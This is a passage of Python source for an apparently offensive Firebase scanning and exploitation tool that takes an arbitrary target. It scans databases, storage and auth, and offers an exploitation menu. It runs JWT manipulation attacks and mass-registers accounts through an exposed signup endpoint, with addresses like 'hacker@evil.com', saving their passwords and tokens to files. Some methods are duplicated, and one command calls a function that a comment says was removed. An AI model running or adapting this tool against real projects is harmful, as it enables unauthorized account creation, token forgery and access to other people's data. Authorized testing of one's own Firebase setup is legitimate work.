            # ("Key Confusion Attack", self._test_key_confusion),
            # ("Public Key Recovery", self._test_public_key_recovery),
            # ("Token Replay Attack", self._test_token_replay),
            # ("Custom Claims Injection", self._test_custom_claims_injection),
            # ("Direct Payload Modification", self._test_direct_payload_modification),
            # ("Header Parameter Injection", self._test_header_injection),
            # ("Cross-JWT Confusion", self._test_cross_jwt_confusion),
            # ("Time-based Attacks", self._test_time_based_attacks),
        ]

        for attack_name, attack_func in jwt_attack_map:
            print(f"\n{Colors.CYAN}[*] Testing: {attack_name}{Colors.ENDC}")
            try:
                result = attack_func(original_token, jwt_analysis, api_key, email)
                if result.get('success'):
                    print(f"{Colors.GREEN}[+] SUCCESS: {attack_name} - {result.get('details', '')}{Colors.ENDC}")
                    attack_data = {'attack': attack_name, 'result': result}
                    successful_attacks.append(attack_data)
                    
                    manipulated_token = result.get('manipulated_token')
                    if manipulated_token:
                        print(f"{Colors.YELLOW}[i] Testing manipulated token...{Colors.ENDC}")
                        # Assumes _test_manipulated_token exists and is appropriate
                        self._test_manipulated_token(manipulated_token, api_key) 
                else:
                    print(f"{Colors.FAIL}[-] FAILED: {attack_name} - {result.get('error', 'No error details')}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] EXCEPTION in {attack_name}: {e}{Colors.ENDC}")
                import traceback
                traceback.print_exc() # For debugging
        
        return successful_attacks

    def _test_jwt_manipulation_bypass_existing(self, api_key: str, user_email: Optional[str] = None, id_token: Optional[str] = None) -> None:
        """Core logic for JWT manipulation testing, using existing or new user token."""
        
        original_id_token_for_cleanup = None # Used if we create a new user

        if not id_token: # Create a new user
            test_email_default = f"jwt_bypass_{int(time.time())}@example.com"
            user_email_input = input(f"{Colors.BOLD}[+] Enter email for new test user (default: {test_email_default}): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else test_email_default
            
            test_password = input(f"{Colors.BOLD}[+] Enter test password (default: JWTBypassPass123!): {Colors.ENDC}").strip()
            if not test_password:
                test_password = "JWTBypassPass123!"

            print(f"\n{Colors.CYAN}[*] Creating user: {user_email} for JWT testing...{Colors.ENDC}")
            user_data = self._create_test_user(user_email, test_password, api_key) # Assumes _create_test_user
            if not user_data or 'idToken' not in user_data:
                print(f"{Colors.FAIL}[!] Could not create test user. Aborting JWT test.{Colors.ENDC}")
                return
            id_token = user_data['idToken']
            original_id_token_for_cleanup = id_token # Store for cleanup
            print(f"{Colors.GREEN}[✓] Test user {user_email} created successfully.{Colors.ENDC}")
            print(f"    ID Token: {id_token[:30]}...{id_token[-10:]}")
        else:
             # Using existing token, user_email should be provided or is a placeholder
            user_email = user_email if user_email else "existing_user@example.com"
            print(f"\n{Colors.CYAN}[*] Using provided ID token for user: {user_email}{Colors.ENDC}")
            print(f"    ID Token: {id_token[:30]}...{id_token[-10:]}")

        # Perform JWT analysis and attacks
        jwt_analysis_initial = self._analyze_jwt(id_token) # Assumes _analyze_jwt
        if 'error' in jwt_analysis_initial:
            print(f"{Colors.FAIL}[!] Could not analyze the provided/created JWT. Aborting.{Colors.ENDC}")
            return
            
        successful_attacks = self._perform_jwt_tests(id_token, api_key, user_email)

        # Summary
        # Assumes _display_jwt_attack_summary exists and is appropriate
        self._display_jwt_attack_summary(successful_attacks, id_token, jwt_analysis_initial)

        # Offer cleanup only if a new user was created as part of this specific test run
        if original_id_token_for_cleanup:
            if input(f"\n{Colors.BOLD}[?] Delete the test user '{user_email}'? (Y/n): {Colors.ENDC}").lower() != 'n':
                if self._delete_test_user(original_id_token_for_cleanup, api_key): # Assumes _delete_test_user
                    print(f"{Colors.GREEN}[✓] Test user {user_email} deleted.{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to delete test user {user_email}.{Colors.ENDC}")

    # Note: _analyze_jwt, _display_jwt_analysis, _test_algorithm_confusion, etc.
    # are assumed to be defined elsewhere in the class or need to be added if they are new.
    # This integration focuses on the main provided functions.

    def _get_target_input(self) -> Optional[str]:
        """Get target from user input"""
        while True:
            print(f"\n{Colors.CYAN}[*] Target Options:{Colors.ENDC}")
            print("1. Firebase Project ID (e.g., my-project-12345)")
            print("2. Firebase App URL (e.g., https://my-app.firebaseapp.com)")
            print("3. Custom domain URL (e.g., https://example.com)")
            
            target = input(f"\n{Colors.BOLD}[+] Enter target: {Colors.ENDC}").strip()
            
            if not target:
                print(f"{Colors.FAIL}[!] Target is required{Colors.ENDC}")
                if input(f"{Colors.WARNING}Try again? (Y/n): {Colors.ENDC}").lower() == 'n':
                    return None
                continue
                
            return target

    def _get_scan_options(self) -> Dict:
        """Get scanning options from user"""
        options = {}
        
        # API Key (optional)
        api_key = input(f"\n{Colors.BOLD}[+] Firebase API Key (optional, for deeper scanning): {Colors.ENDC}").strip()
        if api_key:
            options['api_key'] = api_key
            
        # Scan scope
        print(f"\n{Colors.CYAN}[*] Scan Scope:{Colors.ENDC}")
        print("1. Full scan (all components)")
        print("2. Database only (Realtime DB + Firestore)")
        print("3. Storage only")
        print("4. Authentication only")
        print("5. Custom selection")
        
        scope = input(f"\n{Colors.BOLD}[+] Select scope (1-5): {Colors.ENDC}").strip()
        
        if scope == "2":
            options['scope'] = ['database']
        elif scope == "3":
            options['scope'] = ['storage']
        elif scope == "4":
            options['scope'] = ['auth']
        elif scope == "5":
            print(f"\n{Colors.CYAN}[*] Available Tests:{Colors.ENDC}")
            tests = {
                'database': 'Realtime Database & Firestore',
                'storage': 'Firebase Storage',
                'auth': 'Authentication',
                'functions': 'Cloud Functions',
                'hosting': 'Firebase Hosting',
                'api': 'API Key Security'
            }
            
            for key, desc in tests.items():
                print(f"  {key}: {desc}")
                
            selected = input(f"\n{Colors.BOLD}[+] Select tests (comma-separated): {Colors.ENDC}").strip()
            if selected:
                options['scope'] = [t.strip() for t in selected.split(',') if t.strip() in tests]
        else:
            options['scope'] = ['all']
            
        # Threading
        if input(f"\n{Colors.BOLD}[+] Use multithreading for faster scanning? (Y/n): {Colors.ENDC}").lower() != 'n':
            options['threading'] = True
            
        # Aggressive mode
        if input(f"\n{Colors.BOLD}[+] Enable aggressive mode (more thorough but slower)? (y/N): {Colors.ENDC}").lower() == 'y':
            options['aggressive'] = True
            
        return options

    def _run_scan(self, target: str, options: Dict) -> List[Dict]:
        """Execute the security scan"""
        all_vulnerabilities = []
        
        # Extract Firebase configuration
        if not self._extract_firebase_config(target):
            print(f"{Colors.FAIL}[!] Could not extract Firebase configuration from target{Colors.ENDC}")
            return all_vulnerabilities
            
        # Set API key if provided
        if 'api_key' in options:
            self.api_key = options['api_key']
            
        # Determine what to scan
        scope = options.get('scope', ['all'])
        if 'all' in scope:
            scope = ['database', 'storage', 'auth', 'functions', 'hosting', 'api']
            
        print(f"\n{Colors.CYAN}[*] Starting Firebase Security Scan{Colors.ENDC}")
        print(f"Target: {target}")
        print(f"Project ID: {self.project_id}")
        print(f"Scope: {', '.join(scope)}")
        
        # Define scan functions
        scan_functions = {
            'database': [self._test_realtime_database, self._test_firestore],
            'storage': [self._test_storage],
            'auth': [self._test_authentication],
            'functions': [self._test_cloud_functions],
            'hosting': [self._test_hosting],
            'api': [self._test_api_keys]
        }
        
        # Execute scans
        if options.get('threading', True):
            # Multithreaded scanning
            import concurrent.futures
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                
                for component in scope:
                    if component in scan_functions:
                        for scan_func in scan_functions[component]:
                            futures.append(executor.submit(scan_func))
                            
                for future in concurrent.futures.as_completed(futures):
                    try:
                        vulnerabilities = future.result()
                        all_vulnerabilities.extend(vulnerabilities)
                    except Exception as e:
                        print(f"{Colors.WARNING}[!] Scan error: {e}{Colors.ENDC}")
        else:
            # Sequential scanning
            for component in scope:
                if component in scan_functions:
                    for scan_func in scan_functions[component]:
                        try:
                            vulnerabilities = scan_func()
                            all_vulnerabilities.extend(vulnerabilities)
                        except Exception as e:
                            print(f"{Colors.WARNING}[!] Error in {scan_func.__name__}: {e}{Colors.ENDC}")
                            
        return all_vulnerabilities

    def _generate_report(self, vulnerabilities: List[Dict]) -> None:
        """Generate a detailed security report with exploitation options"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              SECURITY REPORT             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not vulnerabilities:
            print(f"\n{Colors.GREEN}[✓] No vulnerabilities found - Firebase appears to be properly configured!{Colors.ENDC}")
            return
            
        # Group by severity
        critical = [v for v in vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in vulnerabilities if v['severity'] == 'MEDIUM']
        low = [v for v in vulnerabilities if v['severity'] == 'LOW']
        
        print(f"\n{Colors.BOLD}Summary:{Colors.ENDC}")
        print(f"  🔴 Critical: {len(critical)}")
        print(f"  🟠 High: {len(high)}")
        print(f"  🟡 Medium: {len(medium)}")
        print(f"  🔵 Low: {len(low)}")
        print(f"  📊 Total: {len(vulnerabilities)}")
        
        # Check for exploitable vulnerabilities
        exploitable_vulns = [v for v in vulnerabilities if v['type'] in ['Unrestricted User Registration', 'Open Realtime Database', 'Database Write Access']]
        
        if exploitable_vulns:
            print(f"\n{Colors.FAIL}🚨 EXPLOITABLE VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
            print(f"   {len(exploitable_vulns)} vulnerabilities can be exploited immediately")
        
        # Detailed findings
        for severity, vulns, color in [
            ('CRITICAL', critical, Colors.FAIL),
            ('HIGH', high, Colors.WARNING),
            ('MEDIUM', medium, Colors.YELLOW),
            ('LOW', low, Colors.CYAN)
        ]:
            if vulns:
                print(f"\n{color}{'='*50}")
                print(f"{severity} SEVERITY FINDINGS")
                print(f"{'='*50}{Colors.ENDC}")
                
                for i, vuln in enumerate(vulns, 1):
                    print(f"\n{color}[{i}] {vuln['type']}{Colors.ENDC}")
                    print(f"URL: {vuln['url']}")
                    print(f"Description: {vuln['description']}")
                    print(f"Impact: {vuln['impact']}")
                    if 'evidence' in vuln:
                        print(f"Evidence: {vuln['evidence'][:100]}...")
                    if 'exploitation' in vuln:
                        print(f"{Colors.RED}Exploit: {vuln['exploitation'][:100]}...{Colors.ENDC}")
        
        # Exploitation menu
        if exploitable_vulns:
            print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
            print(f"║           EXPLOITATION MENU              ║")
            print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
            
            reg_vulns = [v for v in exploitable_vulns if 'Registration' in v['type']]
            db_vulns = [v for v in exploitable_vulns if 'Database' in v['type']]
            
            if reg_vulns:
                print(f"\n{Colors.YELLOW}[!] User Registration Exploits Available{Colors.ENDC}")
                if input(f"{Colors.BOLD}[?] Launch user registration exploitation? (y/N): {Colors.ENDC}").lower() == 'y':
                    # Use the first registration vulnerability
                    vuln = reg_vulns[0]
                    self._exploit_user_registration(vuln['url'], self.api_key)
            
            if db_vulns:
                print(f"\n{Colors.YELLOW}[!] Database Exploits Available{Colors.ENDC}")
                print("   Manual exploitation recommended for database vulnerabilities")
                for vuln in db_vulns:
                    print(f"   • {vuln['url']}")
        
        # Save report to file
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"firebase_scan_{self.project_id}_{timestamp}.json"
            
            report_data = {
                'timestamp': timestamp,
                'project_id': self.project_id,
                'api_key': self.api_key[:10] + '...' if self.api_key else None,
                'summary': {
                    'total': len(vulnerabilities),
                    'critical': len(critical),
                    'high': len(high),
                    'medium': len(medium),
                    'low': len(low),
                    'exploitable': len(exploitable_vulns)
                },
                'vulnerabilities': vulnerabilities
            }
            
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
                
            print(f"\n{Colors.GREEN}[✓] Report saved to: {filename}{Colors.ENDC}")
            
        except Exception as e:
            print(f"\n{Colors.WARNING}[!] Could not save report: {e}{Colors.ENDC}")

    def run_guided(self) -> None:
        """Interactive guided mode for Firebase scanning"""
        self._show_banner()

        while True:
            try:
                print(f"\n{Colors.CYAN}[*] Firebase Security Assessment{Colors.ENDC}")
                
                # Get target
                target = self._get_target_input()
                if not target:
                    break
                    
                # Get scan options
                options = self._get_scan_options()
                
                # Show configuration
                print(f"\n{Colors.CYAN}[*] Scan Configuration{Colors.ENDC}")
                print(f"{Colors.CYAN}=" * 40)
                print(f"Target: {target}")
                if 'api_key' in options:
                    print(f"API Key: {options['api_key'][:10]}...")
                print(f"Scope: {', '.join(options.get('scope', ['all']))}")
                print(f"Threading: {'Yes' if options.get('threading') else 'No'}")
                print(f"Aggressive: {'Yes' if options.get('aggressive') else 'No'}")
                
                # Confirm and execute
                if input(f"\n{Colors.BOLD}[+] Start scan? (Y/n): {Colors.ENDC}").lower() != 'n':
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                    if vulnerabilities:
                        print(f"\n{Colors.WARNING}[!] Security issues found! Review the report above.{Colors.ENDC}")
                    else:
                        print(f"\n{Colors.GREEN}[✓] No security issues detected.{Colors.ENDC}")

                # Ask for another scan
                if input(f"\n{Colors.BOLD}[?] Scan another target? (y/N): {Colors.ENDC}").lower() != 'y':
                    break

            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
                import traceback
                traceback.print_exc()

    def run_direct(self) -> None:
        """Direct command execution mode"""
        self._show_banner()
        
        print(f"\n{Colors.CYAN}[*] Direct Mode - Firebase Security Commands{Colors.ENDC}")
        print(f"\n{Colors.CYAN}[*] Available Commands:{Colors.ENDC}")
        print("  scan <project-id>                    - Quick scan of project")
        print("  scan <url>                           - Scan Firebase app URL")
        print("  scan <target> --api-key <key>        - Scan with API key")
        print("  scan <target> --database-only        - Database scan only")
        print("  scan <target> --storage-only         - Storage scan only")
        print("  scan <target> --auth-only            - Authentication scan only")
        print("  scan <target> --aggressive           - Aggressive scan mode")
        print("  exploit <project-id> <api-key>       - Launch exploitation menu")
        print("  create-user <email> <password>       - Create single user (requires API key)")
        print("  bulk-users <count>                   - Create multiple users (requires API key)")
        # generate-exploit command removed as its underlying function was deleted
        print("  extract <url>                        - Extract Firebase config from URL")
        print("  help                                 - Show help")
        print("  examples                             - Show usage examples")
        print("  exit                                 - Exit to main menu")
        
        while True:
            try:
                command_input = input(f"\n{Colors.BOLD}firebase-scanner > {Colors.ENDC}").strip()
                
                if not command_input:
                    continue
                    
                if command_input.lower() == 'exit':
                    break
                    
                elif command_input.lower() == 'help':
                    help_info = self.get_help()
                    print(f"\n{Colors.CYAN}=== Firebase Scanner Help ==={Colors.ENDC}")
                    print(f"Description: {help_info['desc']}")
                    print(f"\nFeatures:")
                    for feature, desc in help_info['features'].items():
                        print(f"  • {feature}: {desc}")
                    print(f"\nNotes:")
                    for note in help_info['notes']:
                        print(f"  • {note}")
                
                elif command_input.lower() == 'examples':
                    print(f"\n{Colors.CYAN}[*] Usage Examples:{Colors.ENDC}")
                    examples = [
                        ('Basic project scan', 'scan my-firebase-project'),
                        ('Scan with API key', 'scan my-project --api-key AIzaSyBv...'),
                        ('Database-only scan', 'scan https://my-app.firebaseapp.com --database-only'),
                        ('Full exploitation', 'exploit my-project AIzaSyBv...'),
                        ('Create single user', 'create-user hacker@evil.com MyPassword123!'),
                        ('Create 10 users', 'bulk-users 10'),
                        # ('Generate exploit script', 'generate-exploit'), # Command removed
                        ('Extract config', 'extract https://example.com')
                    ]
                    
                    for i, (title, cmd) in enumerate(examples, 1):
                        print(f"\n{Colors.GREEN}{i}. {title}{Colors.ENDC}")
                        print(f"   {cmd}")
                
                elif command_input.startswith('exploit '):
                    parts = command_input[8:].split()
                    if len(parts) >= 2:
                        project_id = parts[0]
                        api_key = parts[1]
                        
                        # Set the project details
                        self.project_id = project_id
                        self.api_key = api_key
                        
                        # Launch exploitation menu
                        # Use the defined constant template for the signup endpoint
                        exploit_signup_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
                        self._exploit_user_registration(exploit_signup_endpoint, api_key)
                    else:
                        print(f"{Colors.FAIL}[!] Usage: exploit <project-id> <api-key>{Colors.ENDC}")
                
                elif command_input.startswith('create-user '):
                    parts = command_input[12:].split()
                    if len(parts) >= 2 and self.api_key:
                        email = parts[0]
                        password = parts[1]
                        # Use the defined constant template for the signup endpoint
                        create_user_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
                        
                        user_data = {
                            "email": email,
                            "password": password,
                            "returnSecureToken": True
                        }
                        
                        try:
                            response = self.session.post(create_user_endpoint, json=user_data, timeout=10) # Use create_user_endpoint
                            if response.status_code == 200:
                                user_info = response.json()
                                print(f"{Colors.GREEN}[✓] User created: {email}{Colors.ENDC}")
                                print(f"    User ID: {user_info.get('localId', 'Unknown')}")
                                
                                # Save credentials
                                creds_file = f"firebase_user_{user_info.get('localId', 'unknown')}.json"
                                with open(creds_file, 'w') as f:
                                    json.dump({
                                        "email": email,
                                        "password": password,
                                        "user_id": user_info.get('localId'),
                                        "id_token": user_info.get('idToken'),
                                        "created_at": time.time()
                                    }, f, indent=2)
                                print(f"[✓] Credentials saved to: {creds_file}")
                            else:
                                print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
                        except Exception as e:
                            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: create-user <email> <password>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.startswith('bulk-users '):
                    parts = command_input[11:].split()
                    if parts and self.api_key:
                        try:
                            count = int(parts[0])
                            if count > 50:
                                print(f"{Colors.WARNING}[!] Limiting to 50 users for safety{Colors.ENDC}")
                                count = 50
                            
                            # Use the defined constant template for the signup endpoint
                            bulk_signup_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
                            timestamp = int(time.time())
                            created_users = []
                            
                            print(f"{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
                            
                            for i in range(count):
                                email = f"bulk{timestamp}_{i}@evil.com"
                                password = f"BulkPass{i}123!"
                                
                                user_data = {
                                    "email": email,
                                    "password": password,
                                    "returnSecureToken": True
                                }
                                
                                try:
                                    response = self.session.post(bulk_signup_endpoint, json=user_data, timeout=5)
                                    if response.status_code == 200:
                                        user_info = response.json()
                                        created_users.append({
                                            "email": email,
                                            "password": password,
                                            "user_id": user_info.get('localId'),
                                            "id_token": user_info.get('idToken')
                                        })
                                        print(f"{Colors.GREEN}[✓] {email}{Colors.ENDC}")
                                    else:
                                        print(f"{Colors.FAIL}[✗] {email} - {response.status_code}{Colors.ENDC}")
                                except Exception as e:
                                    print(f"{Colors.FAIL}[✗] {email} - {e}{Colors.ENDC}")
                                
                                time.sleep(0.5)  # Rate limiting
                            
                            # Save all users
                            if created_users:
                                bulk_file = f"firebase_bulk_{timestamp}.json"
                                with open(bulk_file, 'w') as f:
                                    json.dump(created_users, f, indent=2)
                                print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
                                print(f"[✓] Saved to: {bulk_file}")
                            
                        except ValueError:
                            print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: bulk-users <count>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.lower() == 'generate-exploit':
                    if self.project_id and self.api_key:
                        # The _generate_jwt_exploit_script method expects `successful_attacks` and `analysis`
                        # These are not available in this direct command context.
                        # Passing empty dicts/lists as placeholders.
                        # This implies the generated script might be less specific if it relies on prior dynamic findings.
                        print(f"{Colors.YELLOW}[i] Note: Generating JWT exploit script without prior dynamic attack context.{Colors.ENDC}")
                        self._generate_jwt_exploit_script([], {}) 
                    else:
                        print(f"{Colors.FAIL}[!] Run a scan first to get project details and API key for full context.{Colors.ENDC}")
                
                elif command_input.startswith('extract '): # All print statements here use f-strings already or no colors
                    url = command_input[8:].strip()
                    if url:
                        print(f"{Colors.CYAN}[*] Extracting Firebase config from: {url}{Colors.ENDC}")
                        if self._extract_firebase_config(url):
                            print(f"Project ID: {self.project_id}")
                            if self.api_key:
                                print(f"API Key: {self.api_key[:10]}...")
                            if self.database_url:
                                print(f"Database URL: {self.database_url}")
                        else:
                            print(f"{Colors.FAIL}[!] Could not extract Firebase config{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] URL required{Colors.ENDC}")
                
                elif command_input.startswith('scan '):
                    parts = command_input[5:].split()
                    if not parts:
                        print(f"{Colors.FAIL}[!] Target required{Colors.ENDC}")
                        continue
                        
                    target = parts[0]
                    options = {'scope': ['all']}
                    
                    # Parse options
                    i = 1
                    while i < len(parts):
                        if parts[i] == '--api-key' and i + 1 < len(parts):
                            options['api_key'] = parts[i + 1]
                            i += 2
                        elif parts[i] == '--database-only':
                            options['scope'] = ['database']
                            i += 1
                        elif parts[i] == '--storage-only':
                            options['scope'] = ['storage']
                            i += 1
                        elif parts[i] == '--auth-only':
                            options['scope'] = ['auth']
                            i += 1
                        elif parts[i] == '--aggressive':
                            options['aggressive'] = True
                            i += 1
                        else:
                            i += 1
                    
                    # Execute scan
                    print(f"{Colors.CYAN}[*] Starting scan of: {target}{Colors.ENDC}")
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                else:
                    print(f"{Colors.FAIL}[!] Unknown command. Type 'help' for available commands.{Colors.ENDC}")
                    
            except KeyboardInterrupt:
                print()
                continue
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")

    def _handle_direct_create_user_command(self, args_str: str) -> None:
        """Handles the 'create-user' command in direct mode."""
        parts = args_str.split()
        if len(parts) < 2:
            print(f"{Colors.FAIL}[!] Usage: create-user <email> <password>{Colors.ENDC}")
            if not self.api_key:
                print(f"{Colors.WARNING}[!] Additionally, an API key is required (usually obtained via a scan first).{Colors.ENDC}")
            return

        if not self.api_key:
            print(f"{Colors.FAIL}[!] API key not set. Run a scan or set API key manually to use this command.{Colors.ENDC}")
            return
            
        email = parts[0]
        password = parts[1]
        
        create_user_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
        
        user_data = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        
        print(f"{Colors.CYAN}[*] Attempting to create user: {email}{Colors.ENDC}")
        response = self._make_request('POST', create_user_endpoint, json=user_data, timeout=10)

        if response and response.status_code == 200:
            try:
                user_info = response.json()
                user_id = user_info.get('localId', 'UnknownUserID')
                print(f"{Colors.GREEN}[✓] User created: {email}{Colors.ENDC}")
                print(f"    User ID: {user_id}")
                
                creds_to_save = {
                    "email": email,
                    "password_attempted": password,
                    "user_id": user_id,
                    "id_token": user_info.get('idToken', ''),
                    "refresh_token": user_info.get('refreshToken', ''),
                    "created_at_timestamp": time.time(),
                    "created_at_readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                    "endpoint_used": create_user_endpoint
                }
                self._save_user_credentials(creds_to_save, "firebase_user_", user_id)
            except json.JSONDecodeError:
                print(f"{Colors.FAIL}[!] Failed to decode JSON response from server: {response.text[:100]}{Colors.ENDC}")
        elif response:
            print(f"{Colors.FAIL}[!] Failed to create user '{email}': {response.status_code}{Colors.ENDC}")
            try:
                error_details = response.json().get('error', {})
                print(f"    {Colors.RED}Error: {error_details.get('message', response.text)}{Colors.ENDC}")
            except json.JSONDecodeError:
                print(f"    {Colors.RED}Raw Response: {response.text[:200]}{Colors.ENDC}")
        else:
            # _make_request already printed an error
            pass

    def _handle_direct_bulk_users_command(self, args_str: str) -> None:
        """Handles the 'bulk-users' command in direct mode."""
        parts = args_str.split()
        if not parts:
            print(f"{Colors.FAIL}[!] Usage: bulk-users <count>{Colors.ENDC}")
            if not self.api_key:
                print(f"{Colors.WARNING}[!] Additionally, an API key is required (usually obtained via a scan first).{Colors.ENDC}")
            return

        if not self.api_key:
            print(f"{Colors.FAIL}[!] API key not set. Run a scan or set API key manually to use this command.{Colors.ENDC}")
            return

        try:
            count = int(parts[0])
            if count > 50: # Limit for safety, consistent with previous logic
                print(f"{Colors.WARNING}[!] Limiting to 50 users for safety.{Colors.ENDC}")
                count = 50
            if count <= 0:
                print(f"{Colors.FAIL}[!] Count must be a positive number.{Colors.ENDC}")
                return
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid count. Please enter a numeric value.{Colors.ENDC}")
            return

        bulk_signup_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
        current_timestamp_for_batch = int(time.time())
        created_users_list = []

        print(f"{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")

        for i in range(count):
            # Using a more generic domain for direct mode bulk creation
            email = f"direct.bulk.{current_timestamp_for_batch}_{i}@example.com"
            password = f"DirectBulkP@$$wd{i}!" 

            user_payload = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            
            print(f"{Colors.CYAN}[*] Attempting to create bulk user: {email}{Colors.ENDC}")
            response = self._make_request('POST', bulk_signup_endpoint, json=user_payload, timeout=7)

            if response and response.status_code == 200:
                try:
                    user_info_resp = response.json()
                    user_id = user_info_resp.get('localId', f'unknown_direct_bulk_{i}')
                    
                    user_details_for_list = {
                        "email": email,
                        "password_attempted": password,
                        "user_id": user_id,
                        "id_token": user_info_resp.get('idToken', ''),
                        "refresh_token": user_info_resp.get('refreshToken', ''),
                        "created_at_timestamp": time.time(),
                        "created_at_readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                        "endpoint_used": bulk_signup_endpoint,
                        "bulk_batch_id": current_timestamp_for_batch,
                        "source_command": "direct_bulk_users"
                    }
                    created_users_list.append(user_details_for_list)
                    print(f"{Colors.GREEN}[✓] Bulk user created: {email} (ID: {user_id}){Colors.ENDC}")
                except json.JSONDecodeError:
                    print(f"{Colors.FAIL}[✗] Failed to decode JSON for bulk user {email}: {response.text[:100]}{Colors.ENDC}")
            elif response:
                print(f"{Colors.FAIL}[✗] Failed to create bulk user {email}: HTTP {response.status_code} - {response.text[:100]}{Colors.ENDC}")
            else:
                # _make_request already printed an error
                print(f"{Colors.FAIL}[✗] No response for bulk user {email}. Skipping.{Colors.ENDC}")
            
            time.sleep(0.5) # Rate limiting, consistent with previous logic

        if created_users_list:
            bulk_filename = f"firebase_direct_bulk_users_batch_{current_timestamp_for_batch}.json"
            try:
                with open(bulk_filename, 'w') as f:
                    json.dump(created_users_list, f, indent=4)
                print(f"\n{Colors.GREEN}[✓] Successfully created {len(created_users_list)} bulk users.{Colors.ENDC}")
                print(f"{Colors.GREEN}[✓] All bulk user credentials saved to: {bulk_filename}{Colors.ENDC}")
            except IOError as e:
                print(f"{Colors.FAIL}[!] Could not save bulk user credentials to {bulk_filename}: {e}{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}[!] No users were created in this bulk operation.{Colors.ENDC}")

    def _handle_direct_exploit_command(self, args_str: str) -> None:
        """Handles the 'exploit' command in direct mode."""
        parts = args_str.split()
        if len(parts) < 2:
            print(f"{Colors.FAIL}[!] Usage: exploit <project-id> <api-key>{Colors.ENDC}")
            return

        project_id = parts[0]
        api_key = parts[1]
        
        # Set the project details for the current session
        self.project_id = project_id
        self.api_key = api_key
        
        print(f"{Colors.CYAN}[*] Initializing exploitation module for project: {project_id}{Colors.ENDC}")
        # Use the defined constant template for the signup endpoint, as _exploit_user_registration expects an endpoint
        exploit_signup_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        self._exploit_user_registration(exploit_signup_endpoint, api_key)

    def _handle_direct_extract_command(self, args_str: str) -> None:
        """Handles the 'extract' command in direct mode."""
        url = args_str.strip()
        if not url:
            print(f"{Colors.FAIL}[!] URL required for extract command. Usage: extract <url>{Colors.ENDC}")
            return

        print(f"{Colors.CYAN}[*] Extracting Firebase config from: {url}{Colors.ENDC}")
        if self._extract_firebase_config(url):
            print(f"{Colors.GREEN}[✓] Extraction successful:{Colors.ENDC}")
            print(f"    Project ID: {self.project_id if self.project_id else 'Not found'}")
            if self.api_key:
                print(f"    API Key: {self.api_key[:10]}...")
            if self.database_url:
                print(f"    Database URL: {self.database_url}")
        else:
            print(f"{Colors.FAIL}[!] Could not extract Firebase config from the provided URL.{Colors.ENDC}")

    def _parse_scan_command_args(self, args_str: str) -> Tuple[Optional[str], Dict]:
        """Helper to parse arguments for the 'scan' command in direct mode."""
        parts = args_str.split()
        if not parts:
            return None, {}
        
        target = parts[0]
        options = {'scope': ['all']} # Default scope
        
        i = 1
        while i < len(parts):
            arg = parts[i]
            if arg == '--api-key' and i + 1 < len(parts):
                options['api_key'] = parts[i + 1]
                i += 2
            elif arg == '--database-only':
                options['scope'] = ['database']
                i += 1
            elif arg == '--storage-only':
                options['scope'] = ['storage']
                i += 1
            elif arg == '--auth-only':
                options['scope'] = ['auth']
                i += 1
            elif arg == '--aggressive':
                options['aggressive'] = True
                i += 1
            else:
                # If an argument is not recognized, it might be a target with spaces
                # or an invalid option. For simplicity, we assume valid options are processed.
                # More sophisticated parsing could be added here if needed.
                print(f"{Colors.WARNING}[!] Unrecognized option: {arg}{Colors.ENDC}")
                i += 1
        return target, options

    def check_installation(self) -> bool:
        """Check if module dependencies are available"""
        try:
            import requests
            import json
            import re
            return True
        except ImportError:
            return False

    def _get_install_command(self, pkg_manager: str) -> List[str]:
        if pkg_manager == 'apt':
            return [
